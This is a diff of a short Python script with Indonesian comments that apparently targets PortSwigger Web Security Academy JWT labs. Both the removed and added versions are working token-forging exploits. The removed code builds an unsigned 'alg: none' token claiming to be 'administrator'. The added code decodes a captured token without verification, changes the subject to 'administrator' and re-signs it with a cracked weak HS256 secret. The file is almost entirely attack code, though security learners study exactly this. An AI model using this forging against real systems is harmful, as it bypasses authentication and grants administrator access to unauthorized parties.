@@ -1,25 +1,25 @@
 import jwt
-import base64
-import json
 
-# 1. Data dari token asli
-old_header = {"kid": "4b7861f1-65ad-434f-9654-61dce9730121", "alg": "none"}
-payload = {
-    "iss": "portswigger",
-    "exp": 1776396511,
-    "sub": "administrator" # Sudah diubah ke administrator
-}
+# 1. Token asli yang ingin diubah
+old_token = "eyJraWQiOiI1NmFlOWQ2NS1hY2MyLTRiMjItOTg1My0xMTM4MGFjYzI5NDgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3NjM5NzMyMSwic3ViIjoid2llbmVyIn0.R10J776u9Mo41p-hDk2a06Wt_fd7masN1tBPtLHc1Ec"
 
-# 2. Fungsi manual untuk membuat token 'none' 
-# Karena beberapa library JWT otomatis menghapus header kustom jika alg=None
-def create_none_token(header, payload):
-    def b64(data):
-        return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).decode().rstrip('=')
+# 2. Secret Key yang kamu temukan (Misal: "secret-123")
+SECRET_KEY = "secret1"
+
+try:
+    # 3. Dekode tanpa verifikasi untuk mengambil data lama
+    payload = jwt.decode(old_token, options={"verify_signature": False})
     
-    # Format JWT: header.payload.signature (signature kosong untuk alg: none)
-    return f"{b64(header)}.{b64(payload)}."
+    # 4. Ubah isi payload
+    payload['sub'] = "administrator"
+    
+    # 5. Generate ulang dengan algoritma HS256 dan Key yang ditemukan
+    # Kita hapus 'kid' dari header jika tidak diperlukan, atau biarkan jika server mencarinya
+    new_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
 
-new_token = create_none_token(old_header, payload)
+    print("--- HASIL MODIFIKASI HS256 ---")
+    print(f"Payload Baru: {payload}")
+    print(f"Token Baru  : {new_token}")
 
-print("--- HASIL GENERATE ---")
-print(f"Token Baru: {new_token}")
+except Exception as e:
+    print(f"Terjadi kesalahan: {e}")
